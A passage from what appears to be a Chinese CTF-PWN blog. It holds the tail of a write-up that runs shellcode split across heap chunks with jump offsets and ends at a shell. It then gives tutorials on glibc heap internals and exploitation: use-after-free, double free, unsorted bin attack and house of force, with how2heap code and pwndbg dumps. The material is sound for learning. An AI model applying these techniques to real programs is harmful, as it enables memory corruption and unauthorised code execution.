punctuation">)</span></code></pre><p>这里我们要让每次接受content的字节数都为7，因为题目自制的read函数最多读入7个字节 然后我们就可以用sendafter函数输入字节数恰好为7的content，就不用输入\n（sendline），否则我们add(‘4’,’8’,asm(‘mov eax,0x3b’)+’\xeb\x19’）就会添上一个\n多余的字节，无法打通。主要是这个地方的原因，其他的都是有剩余空间的。</p><p>跳转机器码是：eb 0x19 =====&gt; jmp short xxx<br>计算过程：<br>xxx = 目标地址-当前地址-2<br><img src="https://s1.ax1x.com/2020/09/11/wtYqN8.png" alt=""></p><p>add过程：<br><img src="https://s1.ax1x.com/2020/09/11/wtYj3Q.png" alt=""></p><p>结果：</p><pre class=" language-java"><code class="language-java">your choice<span class="token operator">>></span> $ whoami<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent <span class="token number">0x7</span> bytes<span class="token operator">:</span>    <span class="token string">'whoami\n'</span><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received <span class="token number">0x7</span> bytes<span class="token operator">:</span>    <span class="token string">'hunter\n'</span>hunter$ </code></pre><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这个题主要是shellcode 分布在几个堆中，利用jmp偏移实现跳转，同样的PIE的解决 也是通过bss段和got表的偏移<br><img src="https://s1.ax1x.com/2020/09/11/wtYbAf.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xctf-pwn-challenge </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Heap--初探--基本漏洞</title>
      <link href="/2020/09/09/heap-chu-tan-ji-ben-lou-dong/"/>
      <url>/2020/09/09/heap-chu-tan-ji-ben-lou-dong/</url>
      
        <content type="html"><![CDATA[<h2 id="First-fit规则"><a href="#First-fit规则" class="headerlink" title="First fit规则"></a>First fit规则</h2><p><strong>在malloc一个chunk时，先在bins中寻找能满足用户需求大小的chunk，也就是大于等于用户需求的大小然后返回，而不是一直遍历到完全符合的chunk。</strong><br>比如说在unsortedbin中，找到了一个大于用户申请的chunk那么就会把这个chunk截断成最符合用户申请的大小然后返回，而剩下的那一块被填入Prev_size size等控制字段重新放入unsortedbin中。<br><img src="https://s1.ax1x.com/2020/09/09/w3Kl4K.png" alt=""><br>利用这个规则可以产生UAF（use after free）漏洞。<br>实在找不到就从top chunk 去切，还不行就调用brk函数增大top chunk（增加量不是很大），用户需求的brk无法满足，就会调用mmap函数去映射一大块虚拟内存给用户使用。</p><h2 id="UAF漏洞原理"><a href="#UAF漏洞原理" class="headerlink" title="UAF漏洞原理"></a>UAF漏洞原理</h2><pre class=" language-c"><code class="language-c"><span class="token keyword">void</span><span class="token operator">*</span> ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>0xn<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">void</span><span class="token operator">*</span> matr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>0xm<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//其中m小于n</span></code></pre><p>这里在free了这个chunk后并没有让留有该chunk地址的ptr置空，即ptr还是指向者该chunk的user data处地址，毕竟free只是改变了关键控制字段而已。<br>然后再次malloc一个小于n的m空间，依据first fit规则会将上个chunk的user data处地址返回到matr中。<br>所以这个chunk就被两个指针控制。</p><p>例子：how2heap</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"This file doesn't demonstrate an attack, but shows the nature of glibc's allocator.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">=</span> <span class="token constant">stderr</span>输出错误信息，没有缓冲区    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"glibc uses a first-fit algorithm to select a free chunk.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"If a chunk is free and large enough, malloc will select this chunk.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"This can be exploited in a use-after-free situation.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Allocating 2 buffers. They can be large, don't have to be fastbin.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span><span class="token operator">*</span> a <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x512</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span><span class="token operator">*</span> b <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x256</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span><span class="token operator">*</span> c<span class="token punctuation">;</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"1st malloc(0x512): %p\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"2nd malloc(0x256): %p\n"</span><span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"we could continue mallocing here...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"now let's put a string at a that we can read later \"this is A!\"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">strcpy</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token string">"this is A!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"first allocation %p points to %s\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Freeing the first one...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"We don't need to free anything again. As long as we allocate smaller than 0x512, it will end up at %p\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"So, let's allocate 0x500 bytes\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    c <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"3rd malloc(0x500): %p\n"</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"And put a different string here, \"this is C!\"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">strcpy</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> <span class="token string">"this is C!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"3rd allocation %p points to %s\n"</span><span class="token punctuation">,</span> c<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"first allocation %p points to %s\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"If we reuse the first allocation, it now holds the data from the third allocation.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>这里先malloc了两个chunk，然后free掉chunk_a,继续malloc一个0x500的chunk_c.那么就会把之前chunk_a的user data地址返回（first fit规则）。<br>在chunk_a中先放入  this is A!  free后chunk_c再次指向同一个chunk，然后填充  this is C 所以i 最后输出chunk_c 和 chunk_a的内容都是一样的：this is C。如下</p><pre class=" language-java"><code class="language-java">This file doesn<span class="token string">'t demonstrate an attack, but shows the nature of glibc'</span>s allocator<span class="token punctuation">.</span>glibc uses a first<span class="token operator">-</span>fit algorithm to select a free chunk<span class="token punctuation">.</span>If a chunk is free and large enough<span class="token punctuation">,</span> malloc will select <span class="token keyword">this</span> chunk<span class="token punctuation">.</span>This can be exploited in a use<span class="token operator">-</span>after<span class="token operator">-</span>free situation<span class="token punctuation">.</span>Allocating <span class="token number">2</span> buffers<span class="token punctuation">.</span> They can be large<span class="token punctuation">,</span> don't have to be fastbin<span class="token punctuation">.</span>1st <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x512</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token number">0x1526010</span>   <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>2nd <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x256</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token number">0x1526530</span>we could <span class="token keyword">continue</span> mallocing here<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>now let's put a string at a that we can read later <span class="token string">"this is A!"</span>  <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>first allocation <span class="token number">0x1526010</span> points to <span class="token keyword">this</span> is A<span class="token operator">!</span>Freeing the first one<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>We don't need to free anything again<span class="token punctuation">.</span> As <span class="token keyword">long</span> as we allocate smaller than <span class="token number">0x512</span><span class="token punctuation">,</span> it will end up at <span class="token number">0x1526010</span>So<span class="token punctuation">,</span> let's allocate <span class="token number">0x500</span> bytes3rd <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token number">0x1526010</span>   <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>And put a different string here<span class="token punctuation">,</span> <span class="token string">"this is C!"</span>   <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>3rd allocation <span class="token number">0x1526010</span> points to <span class="token keyword">this</span> is C<span class="token operator">!</span>   <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>first allocation <span class="token number">0x1526010</span> points to <span class="token keyword">this</span> is C<span class="token operator">!</span>  <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>If we reuse the first allocation<span class="token punctuation">,</span> it now holds the data from the third allocation<span class="token punctuation">.</span></code></pre><p>至于为啥要mallocyige0x256，这个是为了防止free了chunk_a后chunk_a 和相邻 的top chunk合并（两个相邻的free chunk，fastbin的chunk除外），如果合并了那么chunk_a就没了就不会有first fit来利用了。<br><img src="https://s1.ax1x.com/2020/09/09/w3KQN6.png" alt=""></p><h2 id="Double-free"><a href="#Double-free" class="headerlink" title="Double free"></a>Double free</h2><p>顾名思义就是程序对同一个chunk进行了两次free</p><pre class=" language-c"><code class="language-c"><span class="token keyword">void</span><span class="token operator">*</span> ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>0xn<span class="token punctuation">)</span><span class="token keyword">void</span><span class="token operator">*</span> ptr1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>0xm<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token function">free</span><span class="token punctuation">(</span>ptr1<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span></code></pre><p>注意不能接连两次free同一个chunk，稍微高一点版本的glibc就会报错。<br>大概情形如下<br><img src="https://s1.ax1x.com/2020/09/09/w3nNxH.png" alt=""><br>这个时候ptr会认为自己得到了一个可以使用的chunk，而这个chunk就是chunk1，与此同时fastbin以为自己这里还有一个free chunk—–chunk1.即chunk1同时被两个指针指向。<br>那么我就可以用ptr来修改chunk1中fd字段指向某个地址，使得fastbin以为自己除了chunk1又有了一个chunk。<br><img src="https://s1.ax1x.com/2020/09/09/w3nwqI.png" alt=""></p><h2 id="Unsorted-bin-attack"><a href="#Unsorted-bin-attack" class="headerlink" title="Unsorted bin attack"></a>Unsorted bin attack</h2><pre class=" language-c"><code class="language-c">unsorted bin取出chunk的部分：<span class="token comment" spellcheck="true">/* remove from unsorted list */</span><span class="token function">unsorted_chunks</span> <span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token operator">-></span>bk <span class="token operator">=</span> bck<span class="token punctuation">;</span>bck<span class="token operator">-></span>fd <span class="token operator">=</span> <span class="token function">unsorted_chunks</span> <span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>所以在取出一个free chunk之前如果能把该chunk的bk字段改为一个特殊地址-0x10那么，就会让unsortedbin认为在取出该free chunk后还要连接bk指向的chunk：<br><img src="https://s1.ax1x.com/2020/09/09/w3nBZt.png" alt=""><br>如上图，那么target（特殊地址）将会被填入bin_addr，而bin_addr放在libc.so的数据段所以会是一个很大的数字。我们就可以达到一个任意地址写入一个大数的目的。主要来修改一些起到限制作用的字段，如fastbins的最大链表。可以为其他的攻击创造环境</p><h2 id="House-of-force"><a href="#House-of-force" class="headerlink" title="House_of_force"></a>House_of_force</h2><p>利用堆溢出修改top chunk的 size字段。<br><img src="https://s1.ax1x.com/2020/09/09/w3ndsA.png" alt=""><br>我们利用覆盖将top chunk的size覆盖为0xfffffffff（32位最大地址)那么top chunk就会被堆管理器认为是这么大，就可以来覆盖高地址内存空间的值（stack）<br>那么如果我想覆盖下面低地址的值呢，malloc负数即可，因为malloc里的那个参数是定义为无符号数，所以负数会被判定为很大的数。如-1就是0xffffffff（4字节）负数以补码形式存在。<br><strong>现在malloc(-16) ===&gt; malloc_base + 0xfffffff0   ====&gt;  (malloc_base-16) + 0xfffffff0+16 ===&gt;malloc_base-16.</strong><br><img src="https://s1.ax1x.com/2020/09/09/w3naMd.png" alt=""><br>这样就可以修改一些数据</p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原理学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Heap--初探--bins神将</title>
      <link href="/2020/09/07/heap-chu-tan-bins-shen-jiang/"/>
      <url>/2020/09/07/heap-chu-tan-bins-shen-jiang/</url>
      
        <content type="html"><![CDATA[<p>Previously on Heap–初探–chunk的获取与释放：我们当时最大的疑惑差不多就是Free后的chunks都怎么了，这里来逐一解答。</p><h2 id="前情提要"><a href="#前情提要" class="headerlink" title="前情提要"></a>前情提要</h2><p>ptmalloc 会统一管理 heap 和 mmap 映射区域中的空闲的 chunk。当用户再一次请求分配内存时，ptmalloc 分配器会试图在空闲的 chunk 中挑选一块合适的给用户。这样可以避免频繁的系统调用，降低内存分配的开销。<br>如果实在没有合适的就让商人去top chunk切一块下来<br>之后我们堆管理器的操作都是以chunk为最小单元，然后一般说的都是chunk地址而不是user_data_start 地址</p><h3 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h3><p>链表的每个单元都由数据域与指针域组成。<br>单项链表：<br><img src="https://s1.ax1x.com/2020/09/07/wKAqt1.png" alt=""></p><p>双向循环链表:<br><img src="https://s1.ax1x.com/2020/09/07/wKALfx.png" alt=""></p><h2 id="Fastbins"><a href="#Fastbins" class="headerlink" title="Fastbins"></a>Fastbins</h2><blockquote><p>大多数程序经常会申请以及释放一些比较小的内存块。如果将一些较小的 chunk 释放之后发现存在与之相邻的空闲的 chunk 并将它们进行合并，那么当下一次再次申请相应大小的 chunk 时，就需要对 chunk 进行分割，这样就大大降低了堆的利用效率。因为我们把大部分时间花在了合并、分割以及中间检查的过程中。<br>因此，ptmalloc 中专门设计了 fast bin–ctfwiki-pwn<br>为了提高chunk获取和释放的效率，fastbins采用单链表数据结构来存储对应大小的free chunks，并且采用了FILO策略先进先出，利用的是fd进行单链表链接，而不是bk。链表如下：<br><img src="https://s1.ax1x.com/2020/09/07/wKAbkR.png" alt=""><br>所以在free一个可以被放入fastbins的chunk后，他会像压入栈里面一样压入对应的bin（对应大小的bin）中同时其fd会被填入free chunk3的地址（如上图）<br>这就是为啥之前我们在free一个chunk后（被放入了fastbins）我们再去看那个chunk里面的数据fd字段改变的原因。<br>例子：</p></blockquote><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">void</span><span class="token operator">*</span> p1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">void</span><span class="token operator">*</span> p2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">void</span><span class="token operator">*</span> p3 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">void</span><span class="token operator">*</span> p4 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>p3<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>p4<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>gdb执行到return 0；</p><pre class=" language-java"><code class="language-java">In file<span class="token operator">:</span> <span class="token operator">/</span>home<span class="token operator">/</span>matrix<span class="token operator">/</span>test<span class="token punctuation">.</span>c   <span class="token number">10</span>    <span class="token number">11</span>     <span class="token function">free</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token number">12</span>     <span class="token function">free</span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token number">13</span>     <span class="token function">free</span><span class="token punctuation">(</span>p3<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token number">14</span>     <span class="token function">free</span><span class="token punctuation">(</span>p4<span class="token punctuation">)</span><span class="token punctuation">;</span> ► <span class="token number">15</span>     <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>   <span class="token number">16</span> <span class="token punctuation">}</span>──────────────────────────────────────────────────────────────────<span class="token punctuation">[</span> STACK <span class="token punctuation">]</span>──────────────────────────────────────────────────────────────────<span class="token number">00</span><span class="token operator">:</span><span class="token number">0000</span>│ rsp  <span class="token number">0x7fffffffdda0</span> —▸ <span class="token number">0x602010</span> ◂— <span class="token number">0x0</span><span class="token number">01</span><span class="token operator">:</span><span class="token number">0008</span>│      <span class="token number">0x7fffffffdda8</span> —▸ <span class="token number">0x602040</span> —▸ <span class="token number">0x602000</span> ◂— <span class="token number">0x0</span><span class="token number">02</span><span class="token operator">:</span><span class="token number">0010</span>│      <span class="token number">0x7fffffffddb0</span> —▸ <span class="token number">0x602070</span> —▸ <span class="token number">0x602030</span> ◂— <span class="token number">0x0</span><span class="token number">03</span><span class="token operator">:</span><span class="token number">0018</span>│      <span class="token number">0x7fffffffddb8</span> —▸ <span class="token number">0x6020a0</span> —▸ <span class="token number">0x602060</span> ◂— <span class="token number">0x0</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">0020</span>│ rbp  <span class="token number">0x7fffffffddc0</span> —▸ <span class="token function">0x4005e0</span> <span class="token punctuation">(</span>__libc_csu_init<span class="token punctuation">)</span> ◂— push   r15<span class="token number">05</span><span class="token operator">:</span><span class="token number">0028</span>│      <span class="token number">0x7fffffffddc8</span> —▸ <span class="token function">0x7ffff7a2d840</span> <span class="token punctuation">(</span>__libc_start_main<span class="token operator">+</span><span class="token number">240</span><span class="token punctuation">)</span> ◂— mov    edi<span class="token punctuation">,</span> eax<span class="token number">06</span><span class="token operator">:</span><span class="token number">0030</span>│      <span class="token number">0x7fffffffddd0</span> ◂— <span class="token number">0x1</span><span class="token number">07</span><span class="token operator">:</span><span class="token number">0038</span>│      <span class="token number">0x7fffffffddd8</span> —▸ <span class="token number">0x7fffffffdea8</span> —▸ <span class="token number">0x7fffffffe249</span> ◂— <span class="token string">'/home/matrix/a.out'</span>────────────────────────────────────────────────────────────────<span class="token punctuation">[</span> BACKTRACE <span class="token punctuation">]</span>──────────────────────────────────────────────────────────────── ► f <span class="token number">0</span>           4005d6 main<span class="token operator">+</span><span class="token number">112</span>   f <span class="token number">1</span>     7ffff7a2d840 __libc_start_main<span class="token operator">+</span><span class="token number">240</span>─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────pwndbg<span class="token operator">></span> x<span class="token operator">/</span>32gx <span class="token number">0x602010-</span><span class="token number">0x10</span><span class="token number">0x602000</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000031</span>  <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span> chunk1<span class="token number">0x602010</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span>  <span class="token number">0x602020</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span> <span class="token number">0x602030</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000031</span>  <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span> chunk2<span class="token number">0x602040</span><span class="token operator">:</span>    <span class="token number">0x0000000000602000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x602050</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x602060</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000031</span>  <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span> chunk3<span class="token number">0x602070</span><span class="token operator">:</span>    <span class="token number">0x0000000000602030</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x602080</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x602090</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000031</span>  <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span> chunk4<span class="token number">0x6020a0</span><span class="token operator">:</span>    <span class="token number">0x0000000000602060</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x6020b0</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x6020c0</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000020f41</span>  <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span> top chunk<span class="token number">0x6020d0</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span></code></pre><p>可以看到在free了这四个一样的chunk后：chunk4=====&gt;chunk3=====&gt;chunk2=====&gt;chunk1<br><strong>注意这里按理说前一个chunk是free状态然后当前chunk 的size的最后位应该置0。但是这里设计fastbins为了防止相邻两的freechunk合并的情况，就把里面的free chunk的size最后的P位都置1，因为合并后可能又要分类啥的太花费时间了。</strong></p><h2 id="其他bins"><a href="#其他bins" class="headerlink" title="其他bins"></a>其他bins</h2><p>除了fastbins（tache）其他的bins都是双向链表结构。很相似（除largebins）如下。其数据存放规则是FIFO：先进先出<br><img src="https://s1.ax1x.com/2020/09/07/wKV1VH.png" alt=""></p><h3 id="unsortedbin"><a href="#unsortedbin" class="headerlink" title="unsortedbin"></a>unsortedbin</h3><p>存放刚刚释放还未分类且无法进入fastbins中的free chunks，相当于相当于small bins 和large bins的缓冲区。<br><strong>如果用户malloc的大小大于fastbins里面的free chunks那么对管理器会先在unsorted bin中找，如果没找到就会触发unsorted bin中的free chunks遍历并合并，归类到他们该去的bins</strong><br>这里面的chunks很没有规律，大大小小的都有，只有一个bin来存放，是名副其实的垃圾堆。但是可以减少程序中的碎片free chunks</p><h3 id="smallbins"><a href="#smallbins" class="headerlink" title="smallbins"></a>smallbins</h3><p>small bins 中每个 chunk 的大小与其所在的 bin 的 index 的关系为：chunk_size = 2 * SIZE_SZ *index，具体如下<br> 下标 | SIZE_SZ=4（32 位）| SIZE_SZ=8（64 位）<br>–:|:—:|:–<br>2 | 16 | 32<br>3 | 24 | 48<br>4 | 32 | 64<br>5 | 40 | 80<br>x | 2*4*x | 2*8*x<br>63 | 504 | 1008<br>每个bin链表中存放的chunks大小都一致</p><p>可以发现这里的free chunks大小与fastbins中的大小是有一部分重叠的，这背后的原理比较复杂先暂且放放。</p><h3 id="largebins"><a href="#largebins" class="headerlink" title="largebins"></a>largebins</h3><p>有63个bins，管理大于1008bytes的free chunks （64位）但是在基础heap题中一般不会遇到</p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原理学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Heap--初探--chunk的获取与释放</title>
      <link href="/2020/09/07/heap-chu-tan-chunk-de-huo-qu-yu-shi-fang/"/>
      <url>/2020/09/07/heap-chu-tan-chunk-de-huo-qu-yu-shi-fang/</url>
      
